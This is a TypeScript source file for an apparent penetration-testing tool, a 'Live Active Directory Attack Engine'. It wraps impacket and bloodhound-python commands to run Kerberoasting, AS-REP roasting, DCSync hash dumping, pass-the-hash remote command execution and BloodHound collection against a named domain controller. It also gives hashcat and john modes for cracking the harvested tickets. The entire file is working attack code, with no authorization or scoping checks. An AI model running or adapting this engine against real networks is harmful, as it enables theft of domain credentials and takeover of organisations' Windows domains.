/**
 * Live Active Directory Attack Engine
 * Real Kerberoasting, AS-REP Roasting, DCSync, Pass-the-Hash, and BloodHound integration.
 * Uses: impacket-GetUserSPNs, impacket-GetNPUsers, impacket-secretsdump, bloodhound-python (via execFile)
 */

import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import * as fs from 'node:fs'
import * as crypto from 'node:crypto'

const execFileP = promisify(execFile)

function rand() { return crypto.randomBytes(4).toString('hex') }

export interface AdTarget {
  domainController: string
  domain: string
  username?: string
  password?: string
  hashes?: string        // "LM:NTLM" or "NTLM"
}

export interface AdFinding {
  type: 'kerberoast' | 'asrep_roast' | 'dcsync' | 'pth' | 'bloodhound'
  severity: 'critical' | 'high' | 'medium'
  title: string
  detail: string
  hash?: string
  output: string
  tool: string
}

export class LiveAdEngine {
  async kerberoast(target: AdTarget): Promise<AdFinding[]> {
    const findings: AdFinding[] = []
    const outFile = `/tmp/kerberoast_${rand()}.txt`
    try {
      const args = [
        `${target.domain}/${target.username || 'guest'}:${target.password || ''}@${target.domainController}`,
        '-request',
        '-outputfile', outFile,
      ]
      const result = await execFileP('impacket-GetUserSPNs', args, { timeout: 60000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '', stderr: (e as {stderr?: string}).stderr || '' }))
      const out = result.stdout + result.stderr
      let hashes = ''
      try { hashes = fs.readFileSync(outFile, 'utf-8') } catch { /* ignore */ }
      if (hashes.includes('$krb5tgs$')) {
        const hashCount = (hashes.match(/\$krb5tgs\$/g) || []).length
        findings.push({
          type: 'kerberoast',
          severity: 'high',
          title: `Kerberoasting: ${hashCount} SPN ticket(s) harvested`,
          detail: `Harvested ${hashCount} TGS tickets. Crack with: john --wordlist=rockyou.txt or hashcat -m 13100`,
          hash: hashes.slice(0, 1000),
          output: out.slice(0, 500),
          tool: 'impacket-GetUserSPNs',
        })
      }
    } finally {
      try { fs.unlinkSync(outFile) } catch { /* ignore */ }
    }
    return findings
  }

  async asrepRoast(target: AdTarget, userList?: string[]): Promise<AdFinding[]> {
    const findings: AdFinding[] = []
    const userFile = `/tmp/asrep_users_${rand()}.txt`
    if (userList && userList.length > 0) {
      fs.writeFileSync(userFile, userList.join('\n'))
    }
    try {
      const args = [
        `${target.domain}/`,
        '-dc-ip', target.domainController,
        '-format', 'john',
      ]
      if (userList && userList.length > 0) {
        args.push('-usersfile', userFile)
      } else {
        args.push('-no-pass')
      }
      const result = await execFileP('impacket-GetNPUsers', args, { timeout: 60000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '', stderr: (e as {stderr?: string}).stderr || '' }))
      const out = result.stdout + result.stderr
      if (out.includes('$krb5asrep$')) {
        findings.push({
          type: 'asrep_roast',
          severity: 'high',
          title: 'AS-REP Roasting: AS-REP hashes harvested',
          detail: 'Harvested AS-REP hashes for accounts without Kerberos preauthentication. Crack with hashcat -m 18200',
          hash: out.match(/\$krb5asrep\$[^\n]+/)?.[0],
          output: out.slice(0, 1000),
          tool: 'impacket-GetNPUsers',
        })
      }
    } finally {
      try { fs.unlinkSync(userFile) } catch { /* ignore */ }
    }
    return findings
  }

  async dcsync(target: AdTarget): Promise<AdFinding[]> {
    const findings: AdFinding[] = []
    try {
      const targetStr = `${target.domain}/${target.username}:${target.password || ''}@${target.domainController}`
      const args = ['-just-dc', targetStr]
      if (target.hashes) args.push('-hashes', target.hashes)
      const result = await execFileP('impacket-secretsdump', args, { timeout: 120000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '', stderr: (e as {stderr?: string}).stderr || '' }))
      const out = result.stdout + result.stderr
      if (out.includes(':::') || out.includes('krbtgt:')) {
        const hashMatches = out.match(/([a-zA-Z0-9._-]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::)/g)
        findings.push({
          type: 'dcsync',
          severity: 'critical',
          title: 'DCSync Success: Domain NTLM hashes dumped',
          detail: `DCSync succeeded against ${target.domainController}. ${hashMatches?.length || 'Multiple'} account hashes recovered including krbtgt.`,
          output: out.slice(0, 2000),
          tool: 'impacket-secretsdump',
        })
      }
    } catch { /* ignore */ }
    return findings
  }

  async passTheHash(target: AdTarget, command: string = 'whoami'): Promise<AdFinding[]> {
    const findings: AdFinding[] = []
    if (!target.hashes) return findings
    try {
      const targetStr = `${target.domain}/${target.username}@${target.domainController}`
      const args = ['-hashes', target.hashes, targetStr, command]
      const result = await execFileP('impacket-wmiexec', args, { timeout: 30000 }).catch(() => execFileP('impacket-smbexec', args, { timeout: 30000 })).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '', stderr: (e as {stderr?: string}).stderr || '' }))
      const out = result.stdout + result.stderr
      if (out.includes('nt authority') || out.includes('\\') || out.includes(target.domainController)) {
        findings.push({
          type: 'pth',
          severity: 'critical',
          title: `Pass-the-Hash Success on ${target.domainController}`,
          detail: `Pass-the-Hash command execution succeeded. Output: ${out.trim().slice(0, 300)}`,
          output: out.slice(0, 500),
          tool: 'impacket-wmiexec',
        })
      }
    } catch { /* ignore */ }
    return findings
  }

  async runBloodhound(target: AdTarget): Promise<AdFinding[]> {
    const findings: AdFinding[] = []
    const outDir = `/tmp/bh_${rand()}`
    fs.mkdirSync(outDir, { recursive: true })
    try {
      const args = [
        '-c', 'All',
        '-u', target.username || '',
        '-p', target.password || '',
        '-d', target.domain,
        '-dc', target.domainController,
        '--zip',
      ]
      const result = await execFileP('bloodhound-python', args, { cwd: outDir, timeout: 180000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '', stderr: (e as {stderr?: string}).stderr || '' }))
      const files = fs.readdirSync(outDir)
      const zipFile = files.find(f => f.endsWith('.zip'))
      if (zipFile) {
        findings.push({
          type: 'bloodhound',
          severity: 'medium',
          title: `BloodHound collection complete: ${zipFile}`,
          detail: `Collected BloodHound data saved to ${outDir}/${zipFile}. Import into BloodHound GUI for attack path analysis.`,
          output: (result.stdout + result.stderr).slice(0, 500),
          tool: 'bloodhound-python',
        })
      }
    } catch { /* ignore */ }
    return findings
  }
}
